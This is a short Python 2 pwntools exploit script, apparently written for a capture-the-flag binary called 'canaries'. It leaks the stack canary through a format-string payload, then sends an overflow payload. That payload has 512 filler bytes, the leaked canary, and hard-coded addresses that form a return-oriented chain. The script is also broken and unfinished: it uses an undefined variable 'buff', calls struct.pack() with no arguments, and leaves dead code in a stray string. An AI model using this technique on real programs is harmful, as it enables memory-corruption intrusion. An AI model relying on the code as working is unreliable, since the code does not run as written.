#!/usr/bin/env python

from pwn import *
import sys, struct
import binascii

def exploit():
	p = process(['./canaries'])
	print util.proc.pidof(p) 
	sys.stdin.read(1)

	print p.recv()
	p.sendline("AAAA" + "%129$x." + "%1$x")
	leak = p.recv()
	canary = leak[4:12]
	scloc = "ffffcb00"
	print "Canary: "+ canary
	#We will convert the canary value
	canary = int(canary,16)
	scloc = int(scloc,16)
	attack = "A\00"
	attack += "C" *510
	attack += struct.pack('<I',canary)
	attack += "OKOK"
	attack += struct.pack('<I',0x080dead5)
	attack += "\x00\x00\x00\x00"
	attack += struct.pack('<I',0x0806f0c9)
	attack += struct.pack('<I',buff)
	attack += "\x00\x00\x00\x00"
	attack += struct.pack()
	#canary = int(canary, 16)
	#p.sendline("A\00" + "C" * 510 + "DDDDKKKK" + "\xba\xba\xba\xba")
	#p.sendline("A\00" + "C" * 510 + ncanary + "KKKK" + "\xba\xba\xba\xba")
	p.sendline(attack)
	p.recv()
	p.recv()
'''
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
'''
if __name__ == "__main__":
	try:
		exploit()
	except:
		print "[-] Unable to run exploit."